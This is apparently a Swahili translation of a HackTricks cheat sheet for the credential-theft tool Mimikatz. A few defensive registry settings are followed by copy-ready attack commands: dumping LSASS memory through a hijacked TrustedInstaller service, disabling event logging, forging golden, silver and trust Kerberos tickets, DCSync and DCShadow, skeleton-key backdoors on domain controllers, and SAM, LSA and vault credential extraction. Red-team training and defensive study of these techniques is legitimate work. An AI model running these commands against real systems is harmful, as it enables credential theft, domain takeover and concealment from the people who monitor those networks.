# Mimikatz

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Ukurasa huu umetokana na [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Angalia asili kwa maelezo zaidi!

## LM na Nakala-Wazi kwenye kumbukumbu

Kuanzia Windows 8.1 na Windows Server 2012 R2 na kuendelea, hatua muhimu zimechukuliwa kuzuia wizi wa vitambulisho:

- **Hash za LM na nywila za nakala-wazi** hazihifadhiwi tena kwenye kumbukumbu ili kuimarisha usalama. Mazingira maalum ya usajili, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, lazima iwe imewekwa na thamani ya DWORD ya `0` ili kulemaza Uthibitishaji wa Digest, kuhakikisha nywila za "nakala-wazi" hazihifadhiwi kwenye LSASS.

- **LSA Protection** imeanzishwa kulinda mchakato wa Mamlaka ya Usalama wa Ndani (LSA) kutokana na kusomwa kwa kumbukumbu na kuingiza nambari kwa njia isiyoidhinishwa. Hii inafanikiwa kwa kuweka alama kwenye LSASS kama mchakato uliolindwa. Kuamsha LSA Protection kunahusisha:
1. Kubadilisha usajili kwenye _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ kwa kuweka `RunAsPPL` kuwa `dword:00000001`.
2. Kutekeleza Kundi la Sera (GPO) ambalo linahakikisha mabadiliko haya ya usajili yanatekelezwa kwenye vifaa vilivyosimamiwa.

Licha ya ulinzi huu, zana kama Mimikatz zinaweza kuzunguka LSA Protection kwa kutumia madereva maalum, ingawa hatua kama hizo zinaweza kurekodiwa katika magogo ya tukio.

### Kupambana na Kuondolewa kwa SeDebugPrivilege

Kawaida, wasimamizi wana SeDebugPrivilege, ambayo inawawezesha kudurusu programu. Uwezo huu unaweza kuzuiliwa ili kuzuia uchukuzi usiothibitishwa wa kumbukumbu, mbinu ya kawaida inayotumiwa na wadukuzi kuchukua vitambulisho kutoka kwenye kumbukumbu. Walakini, hata na uwezo huu kuondolewa, akaunti ya TrustedInstaller bado inaweza kufanya uchukuzi wa kumbukumbu kwa kutumia usanidi wa huduma ulioboreshwa:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Hii inaruhusu kumwaga kumbukumbu ya `lsass.exe` kwenye faili, ambayo kisha inaweza kuchambuliwa kwenye mfumo mwingine ili kutoa siri za kuingia:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Chaguo za Mimikatz

Udanganyifu wa kumbukumbu za matukio katika Mimikatz unahusisha hatua mbili kuu: kufuta kumbukumbu za matukio na kurekebisha huduma ya Matukio ili kuzuia kurekodi matukio mapya. Hapa chini ni amri za kutekeleza hatua hizi:

#### Kufuta Kumbukumbu za Matukio

- **Amri**: Hatua hii inalenga kufuta kumbukumbu za matukio, hivyo kuwa ngumu kufuatilia shughuli za uovu.
- Mimikatz haipatii amri moja kwa moja katika nyaraka zake za kawaida za kufuta kumbukumbu za matukio moja kwa moja kupitia mstari wake wa amri. Hata hivyo, kawaida udanganyifu wa kumbukumbu za matukio unahusisha kutumia zana za mfumo au hati nje ya Mimikatz kufuta kumbukumbu maalum (kwa mfano, kutumia PowerShell au Windows Event Viewer).

#### Kipengele cha Majaribio: Kurekebisha Huduma ya Matukio

- **Amri**: `event::drop`
- Amri hii ya majaribio imeundwa kurekebisha tabia ya Huduma ya Kurekodi Matukio, kwa kuzuia kurekodi matukio mapya.
- Mfano: `mimikatz "privilege::debug" "event::drop" exit`

- Amri ya `privilege::debug` inahakikisha kuwa Mimikatz inafanya kazi na mamlaka muhimu ya kurekebisha huduma za mfumo.
- Kisha amri ya `event::drop` inarekebisha huduma ya Kurekodi Matukio.

### Mashambulizi ya Tiketi ya Kerberos

### Uundaji wa Tiketi ya Dhahabu

Tiketi ya Dhahabu inaruhusu uigaji wa ufikiaji kwa kiwango cha kikoa. Amri muhimu na vigezo:

- Amri: `kerberos::golden`
- Vigezo:
- `/domain`: Jina la kikoa.
- `/sid`: Kitambulisho cha Usalama (SID) cha kikoa.
- `/user`: Jina la mtumiaji wa kuigiza.
- `/krbtgt`: Hash ya NTLM ya akaunti ya huduma ya KDC ya kikoa.
- `/ptt`: Kuingiza tiketi moja kwa moja kwenye kumbukumbu.
- `/ticket`: Hifadhi tiketi kwa matumizi ya baadaye.

Mfano:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Uundaji wa Tiketi ya Fedha

Tiketi za Fedha hutoa ufikiaji kwa huduma maalum. Amri muhimu na vigezo:

- Amri: Kama Tiketi ya Dhahabu lakini inalenga huduma maalum.
- Vigezo:
- `/service`: Huduma ya kulenga (kwa mfano, cifs, http).
- Vigezo vingine kama Tiketi ya Dhahabu.

Mfano:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Uundaji wa Tiketi ya Imani

Tiketi za Imani hutumiwa kupata rasilimali kati ya uhusiano wa imani. Amri muhimu na vigezo:

- Amri: Kama Tiketi ya Dhahabu lakini kwa uhusiano wa imani.
- Vigezo:
- `/target`: Jina kamili la kikoa cha lengo.
- `/rc4`: Hash ya NTLM kwa akaunti ya imani.

Mfano:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Amri za Ziada za Kerberos

- **Kuorodhesha Tiketi**:
- Amri: `kerberos::list`
- Inaorodhesha tiketi zote za Kerberos kwa kikao cha mtumiaji wa sasa.

- **Pitisha Hifadhi**:
- Amri: `kerberos::ptc`
- Inasambaza tiketi za Kerberos kutoka kwenye faili za hifadhi.
- Mfano: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pitisha Tiketi**:
- Amri: `kerberos::ptt`
- Inaruhusu kutumia tiketi ya Kerberos katika kikao kingine.
- Mfano: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Futa Tiketi**:
- Amri: `kerberos::purge`
- Inafuta tiketi zote za Kerberos kutoka kwenye kikao.
- Inafaa kabla ya kutumia amri za kubadilisha tiketi ili kuepuka migogoro.


### Uharibifu wa Active Directory

- **DCShadow**: Kwa muda kufanya kifaa kifanye kama DC kwa ajili ya uhariri wa vitu vya AD.
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Kujifanya kama DC ili kuomba data ya nywila.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Upatikanaji wa Vitambulisho

- **LSADUMP::LSA**: Pata vitambulisho kutoka LSA.
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Jifanya kama DC kwa kutumia data ya nywila ya akaunti ya kompyuta.
- *Hakuna amri maalum iliyotolewa kwa NetSync katika muktadha wa awali.*

- **LSADUMP::SAM**: Fikia hifadhidata ya SAM ya ndani.
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Fungua siri zilizohifadhiwa kwenye usajili.
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Weka hash mpya ya NTLM kwa mtumiaji.
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Pata habari za uwakilishi wa uaminifu.
- `mimikatz "lsadump::trust" exit`

### Mbalimbali

- **MISC::Skeleton**: Ingiza mlango nyuma kwenye LSASS kwenye DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Kupandisha Hadhi ya Mamlaka

- **PRIVILEGE::Backup**: Pata haki za kuhifadhi nakala.
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Pata haki za kufuatilia.
- `mimikatz "privilege::debug" exit`

### Kuvuja Vitambulisho

- **SEKURLSA::LogonPasswords**: Onyesha vitambulisho kwa watumiaji walioingia.
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Pata tiketi za Kerberos kutoka kwenye kumbukumbu.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid na Uhariri wa Alama

- **SID::add/modify**: Badilisha SID na SIDHistory.
- Ongeza: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Badilisha: *Hakuna amri maalum ya kubadilisha katika muktadha wa awali.*

- **TOKEN::Elevate**: Jifanya kama alama.
- `mimikatz "token::elevate /domainadmin" exit`

### Huduma za Terminal

- **TS::MultiRDP**: Ruhusu vikao vingi vya RDP.
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Onyesha vikao vya TS/RDP.
- *Hakuna amri maalum iliyotolewa kwa TS::Sessions katika muktadha wa awali.*

### Hazina

- Pata nywila kutoka kwenye Hazina ya Windows.
- `mimikatz "vault::cred /patch" exit`


<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikitangazwa katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) maalum.
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PR kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
